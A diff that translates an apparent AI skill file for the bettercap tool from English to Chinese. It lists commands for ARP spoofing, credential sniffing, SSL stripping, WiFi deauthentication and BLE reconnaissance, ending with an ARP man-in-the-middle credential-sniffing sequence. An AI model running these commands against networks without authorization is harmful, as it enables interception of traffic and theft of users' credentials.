@@ -1,39 +1,35 @@
 ---
 name: bettercap
 description: >
-  This skill should be used when the user asks about "bettercap", "performing
-  LAN MITM, WiFi deauth/probe attacks, BLE reconnaissance", "HTTPS SSL
-  stripping". Swiss Army knife for WiFi, Bluetooth, HID, and Ethernet network
-  attacks including ARP spoofing, MITM, traffic sniffing, and credential
-  harvesting.
+  此技能适用于用户询问关于 "bettercap"、"执行 LAN 中间人攻击 (MITM)、WiFi 去认证/探测攻击、BLE 侦察"、"HTTPS SSL 剥离 (SSL stripping)" 等内容。集 WiFi、蓝牙、HID 和以太网网络攻击于一体的多功能工具，包括 ARP 欺骗、中间人攻击、流量嗅探和凭据窃取。
 ---
 
 # Bettercap
 
-Network attack Swiss Army knife: MITM, sniff, spoof.
+网络攻击多功能工具：中间人攻击 (MITM)、嗅探、欺骗。
 
-## Quick Start
+## 快速开始
 
 ```bash
 sudo bettercap -iface eth0
 sudo bettercap -iface eth0 -caplet http-ui
 ```
 
-## Core REPL Commands
+## 核心 REPL 命令
 
-| Command | Purpose |
+| 命令 | 用途 |
 |---------|---------|
-| `net.probe on` | Discover LAN hosts |
-| `net.show` | List discovered hosts |
-| `arp.spoof on` | Enable ARP spoofing MITM |
-| `set arp.spoof.targets <ip>` | Limit MITM to target |
-| `net.sniff on` | Capture credentials/traffic |
-| `https.proxy on` | HTTPS with SSL strip |
-| `wifi.recon on` | WiFi AP/client discovery |
-| `wifi.deauth <mac>` | Deauthenticate client |
-| `ble.recon on` | BLE device scan |
+| `net.probe on` | 发现局域网主机 |
+| `net.show` | 列出已发现的主机 |
+| `arp.spoof on` | 启用 ARP 欺骗中间人攻击 |
+| `set arp.spoof.targets <ip>` | 将中间人攻击限定到目标 |
+| `net.sniff on` | 捕获凭据/流量 |
+| `https.proxy on` | 启用 HTTPS 与 SSL 剥离 |
+| `wifi.recon on` | WiFi AP/客户端发现 |
+| `wifi.deauth <mac>` | 对客户端发送去认证包 |
+| `ble.recon on` | BLE 设备扫描 |
 
-## ARP MITM + credential sniff
+## ARP 中间人攻击 + 凭据嗅探
 
 ```
 sudo bettercap -iface eth0
@@ -44,8 +40,8 @@ arp.spoof on
 net.sniff on
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
+| 文件 | 加载时机 |
 |------|--------------|
-| `references/` | Caplet examples and module reference |
+| `references/` | Caplet 示例与模块参考 |
